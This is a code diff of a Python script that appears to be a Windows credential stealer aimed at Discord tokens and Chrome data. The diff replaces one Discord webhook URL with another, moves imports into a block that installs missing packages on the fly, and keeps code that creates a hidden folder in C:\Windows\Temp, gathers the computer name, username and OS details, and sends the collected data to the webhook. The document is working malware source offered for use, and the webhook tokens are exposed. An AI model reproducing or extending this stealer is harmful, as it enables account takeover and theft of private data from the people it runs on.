@@ -4,24 +4,18 @@
 import os
 if os.name != "nt":
 	exit()
-from re import findall
-import json
-import sqlite3
-import shutil
-import requests
 import sys
 import base64
-from Crypto.Cipher import AES
-import getpass
-import platform as plt
 from json import loads, dumps
+import json
+from Crypto.Cipher import AES
 from base64 import b64decode
 import subprocess
 from subprocess import Popen, PIPE
 from urllib.request import Request, urlopen
 from datetime import timezone, datetime, timedelta
 
-webhook_url = "https://discord.com/api/webhooks/913114636935639051/JULTS369KJGCNpceCiH7V6YXgZj4f8nEkbb-uQDrhP-9-2T_CCbw1-kDLFYNCD37MtTa"
+webhook_url = "https://discord.com/api/webhooks/913148858337489016/p1xUBbcRJFmCmtcC7qJ3TuMIeYGT7BtYDgEFG2hMIxO5Y5c5p76Gf8P4zjG3G2A8IlyE"
 path = r'C:\Windows\Temp\LocalCustom\ssh\new\custom'
 if not os.path.exists(path):
     os.makedirs(path)
@@ -61,13 +55,7 @@ chromefile = 'chrome_dump.txt'
 comepleteName = os.path.join(path,chromefile)
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
-sysinfo = f"""
-        Operating System: {plt.system()}
-        Computer Name: {plt.node()}
-        Username: {getpass.getuser()}
-        Release Version: {plt.release()}
-        Processor Architecture: {plt.processor()}
-                    """
+
 PATHS = {
 	"Discord"           : ROAMING + "\\Discord",
 	"Discord Canary"    : ROAMING + "\\discordcanary",
@@ -86,6 +74,28 @@ try:
 except ImportError or NameError:
 	install('pywin32')
 	install('dhooks')
+try:
+	import shutil
+	import requests
+	import sqlite3
+	import platform as plt
+	from re import findall
+	import getpass
+except ImportError or NameError:
+	install('shutil')
+	install('re')
+	install('requests')
+	install('sqlite3')
+	install('platform')
+	install('getpass')
+
+sysinfo = f"""
+        Operating System: {plt.system()}
+        Computer Name: {plt.node()}
+        Username: {getpass.getuser()}
+        Release Version: {plt.release()}
+        Processor Architecture: {plt.processor()}
+                    """
 hook = Webhook(webhook_url)
 def getheaders(token=None, content_type="application/json"):
 	headers = {
